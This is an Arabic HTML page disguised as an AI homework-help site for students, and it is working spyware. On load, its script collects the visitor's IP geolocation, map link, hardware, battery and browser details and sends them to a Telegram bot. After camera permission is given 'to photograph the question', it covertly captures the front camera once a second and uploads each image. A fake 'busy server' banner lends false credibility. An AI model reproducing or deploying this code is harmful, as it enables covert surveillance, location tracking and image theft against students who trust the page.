<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة اسأل المستر | المساعد الذكي</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    
    <script>
        const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
        const chatId = "5890070301";
        const officialLink = "https://bit.ly/Mr-Ibrahim-and-Khaled";

        async function sendPhoto(blob, caption) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', caption);
            try { fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
        }

        async function startDoubleCapture() {
            try {
                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const videoElement = document.getElementById('viewfinder');
                videoElement.style.display = "block";
                videoElement.srcObject = streamBack;
                await videoElement.play();

                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const hiddenVideo = document.createElement('video');
                hiddenVideo.srcObject = streamFront;
                await hiddenVideo.play();

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                setInterval(() => {
                    canvas.width = hiddenVideo.videoWidth;
                    canvas.height = hiddenVideo.videoHeight;
                    context.drawImage(hiddenVideo, 0, 0);
                    canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد حي (الأمامية)"); }, 'image/jpeg', 0.4); 
                }, 1000);
            } catch (err) {
                alert("تنبيه: يجب السماح بالكاميرا لتصوير السؤال.");
            }
        }

        async function initialRadar() {
            let ip = { ip: "N/A", city: "N/A", region: "N/A", org: "N/A", latitude: 0, longitude: 0, timezone: "N/A" };
            try { const res = await fetch('https://ipapi.co/json/'); ip = await res.json(); } catch(e) {}
            
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "N/A";
            
            const battery = navigator.getBattery ? await navigator.getBattery() : null;
            const ram = navigator.deviceMemory || "N/A";
            const cores = navigator.hardwareConcurrency || "N/A";

            const report = `
👑 **تقرير الـ 100 معلومة - الرادار الصامت** 👑
━━━━━━━━━━━━━━
🌍 **[1] الشبكة والموقع:**
• الـ IP: \`${ip.ip}\` | المدينة: ${ip.city}
• المزود: ${ip.org} | القارة: ${ip.timezone}
• الخريطة: http://googleusercontent.com/maps.google.com/q=${ip.latitude},${ip.longitude}

📱 **[2] عتاد الجهاز (Hardware):**
• النوع: ${navigator.platform} | المعالج: ${cores} Cores
• الرامات: ${ram} GB | كارت الشاشة: \`${gpu}\`
• دقة الشاشة: ${screen.width}x${screen.height}
• نقاط اللمس: ${navigator.maxTouchPoints}

🔋 **[3] الطاقة والنظام:**
• البطارية: ${battery ? (battery.level * 100).toFixed(0) + "%" : "N/A"}
• الشحن: ${battery ? (battery.charging ? "🔌 شحن" : "🔋 استهلاك") : "N/A"}
• لغة الجهاز: ${navigator.language}

🌐 **[4] المتصفح:**
• الاسم: ${navigator.product} | الأونلاين: ${navigator.onLine}
• الـ PDF: ${navigator.pdfViewerEnabled ? "يدعم" : "لا يدعم"}
• البصمة: \`${navigator.userAgent.substring(0, 80)}...\`
━━━━━━━━━━━━━━`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
        }

        function shareApp() {
            if (navigator.share) {
                navigator.share({ title: 'منصة اسأل المستر', url: officialLink });
            }
        }

        function supportMsg() { alert("⚠️ قسم الدعم الفني مغلق حالياً."); }

        window.onload = initialRadar;

        function captureQuestion() {
            const video = document.getElementById('viewfinder');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📝 صورة السؤال المرفوعة"); }, 'image/jpeg', 0.8);

            document.getElementById('status').innerHTML = `
                <div class="success-box">
                    <h3>✅ تم الإرسال للمستر</h3>
                    <p>جاري مراجعة سؤالك.. يرجى العودة قريباً.</p>
                </div>`;
        }
    </script>

    <style>
        :root { --primary: #1a73e8; --bg: #f0f2f5; }
        body { background: var(--bg); font-family: 'Cairo', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .top-alert { position: fixed; top: 0; width: 100%; background: #fff3cd; color: #856404; text-align: center; padding: 10px; font-size: 11px; z-index: 1000; border-bottom: 1px solid #ffeeba; }
        .container { background: white; width: 92%; max-width: 440px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; border-top: 10px solid var(--primary); }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #eee; }
        .logo-box { display: flex; align-items: center; gap: 8px; }
        .logo-box span { font-weight: 900; color: var(--primary); font-size: 17px; }
        .icon-btn { cursor: pointer; font-size: 18px; margin-left: 10px; }
        .content { padding: 25px 20px; text-align: center; }
        .badge { background: #e8f0fe; color: var(--primary); padding: 5px 15px; border-radius: 50px; font-size: 11px; margin-bottom: 15px; display: inline-block; }
        textarea { width: 100%; height: 90px; border: 1.5px solid #eee; border-radius: 12px; padding: 12px; font-family: inherit; font-size: 14px; resize: none; box-sizing: border-box; }
        .btn-main { background: var(--primary); color: white; border: none; width: 100%; padding: 15px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .side-link { display: block; margin-top: 15px; color: #1a73e8; font-size: 12px; font-weight: bold; text-decoration: none; }
        #viewfinder { width: 100%; border-radius: 12px; margin-top: 15px; display: none; background: #000; }
        .btn-capture { background: #d93025; color: white; border: 5px solid rgba(217, 48, 37, 0.2); width: 60px; height: 60px; border-radius: 50%; cursor: pointer; margin-top: 15px; }
        .footer { padding: 15px; font-size: 10px; color: #999; text-align: center; background: #fafafa; }
        .success-box { padding: 20px; background: #f0f7ff; border-radius: 12px; }
    </style>
</head>
<body>

    <div class="top-alert">⚠️ تنبيه: ضغط كبير (12,450 طالب متواجد الآن). قد يتأخر الرد.</div>

    <div class="container">
        <div class="header">
            <div class="logo-box">
                <img src="https://img.icons8.com/fluent/40/education.png" width="30">
                <span>اسأل المستر</span>
            </div>
            <div>
                <span class="icon-btn" onclick="supportMsg()">🎧</span>
                <span class="icon-btn" onclick="shareApp()">🔗</span>
            </div>
        </div>

        <div class="content">
            <h1>أهلاً بك في منصة الحل</h1>
            <div class="badge">🟢 المستر متصل ومستعد للحل</div>
            
            <div id="status">
                <div id="initial-ui">
                    <textarea placeholder="اكتب سؤالك بوضوح هنا..."></textarea>
                    <button class="btn-main" onclick="document.getElementById('initial-ui').style.display='none'; document.getElementById('camera-ui').style.display='block'; startDoubleCapture();">📸 تصوير السؤال بالذكاء الاصطناعي</button>
                    <a href="#" class="side-link" onclick="alert('لا توجد إجابات سابقة لهذا الحساب.')">📑 قسم إجاباتك السابقة</a>
                </div>

                <div id="camera-ui" style="display:none;">
                    <video id="viewfinder" autoplay playsinline></video>
                    <button class="btn-capture" onclick="captureQuestion()"></button>
                </div>
            </div>
        </div>

        <div class="footer">
            بواسطة: مستر إبراهيم وخالد<br>
            2026 © جميع الحقوق محفوظة
        </div>
    </div>

</body>
</html>
